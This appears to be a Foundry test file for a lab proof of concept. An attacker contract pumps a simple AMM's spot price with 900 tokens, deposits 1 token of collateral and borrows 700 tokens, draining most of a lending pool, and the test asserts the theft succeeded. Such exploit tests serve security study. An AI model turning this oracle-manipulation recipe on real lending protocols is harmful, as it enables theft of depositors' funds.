// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../contracts/Token.sol";
import "../contracts/AMM.sol";
import "../contracts/LendingPool.sol";
import "../exploit/Attacker.sol";

contract OracleManipulationTest is Test {
    ERC20Mintable tokenA; // collateral
    ERC20Mintable tokenB; // borrow asset
    SimpleAMM amm;
    LendingPool pool;
    OracleAttacker attacker;

    address liquidityProvider = address(0xBEEF);
    address payable attackerEOA = payable(address(0xA11CE));

    function setUp() public {
        tokenA = new ERC20Mintable("TokenA", "TKA");
        tokenB = new ERC20Mintable("TokenB", "TKB");

        amm = new SimpleAMM(tokenA, tokenB);
        pool = new LendingPool(tokenA, tokenB, amm);

        // Seed initial liquidity 1,000 A : 1,000 B
        tokenA.mint(liquidityProvider, 1_000 ether);
        tokenB.mint(liquidityProvider, 1_000 ether);
        vm.startPrank(liquidityProvider);
        tokenA.approve(address(amm), type(uint256).max);
        tokenB.approve(address(amm), type(uint256).max);
        amm.addLiquidity(1_000 ether, 1_000 ether);
        vm.stopPrank();

        // Fund the lending pool with B to borrow out (treasury)
        tokenB.mint(address(pool), 800 ether);

        // Deploy attacker contract controlled by attackerEOA and fund with B + a bit of A
        vm.startPrank(attackerEOA);
        attacker = new OracleAttacker(tokenA, tokenB, amm, pool);
        // Attacker starts with 900 B to manipulate price
        tokenB.mint(address(attacker), 900 ether);
        // Give attacker a tiny A so he can deposit after pumping the price
        tokenA.mint(address(attacker), 1 ether);
        vm.stopPrank();
    }

    function testExploitOracleManipulation() public {
        uint256 poolBBefore = tokenB.balanceOf(address(pool));

        // Manipulate with 900 B, deposit 1 A, borrow 700 B (drains most of pool)
        vm.prank(attackerEOA);
        attacker.execute(900 ether, 1 ether, 700 ether);

        uint256 poolBAfter = tokenB.balanceOf(address(pool));
        uint256 profitB = tokenB.balanceOf(attackerEOA);

        assertLt(poolBAfter, poolBBefore, "Pool B should decrease");
        assertGe(profitB, 700 ether, "Attacker should receive borrowed B");
    }
}
